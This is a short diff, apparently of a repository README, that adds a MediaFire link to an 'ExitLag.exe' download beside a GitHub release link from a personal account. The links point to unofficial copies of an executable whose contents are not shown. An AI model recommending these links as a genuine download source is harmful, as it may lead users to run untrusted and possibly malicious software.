@@ -2,7 +2,7 @@ Download =====>
 
 "1" https://github.com/marcusmigl/ExitLag/releases/download/update/ExitLag.exe
 
-"2" 
+"2" https://www.mediafire.com/file/q15pzbach65lr4r/ExitLag.exe/file
 
 "3" realeas     
 
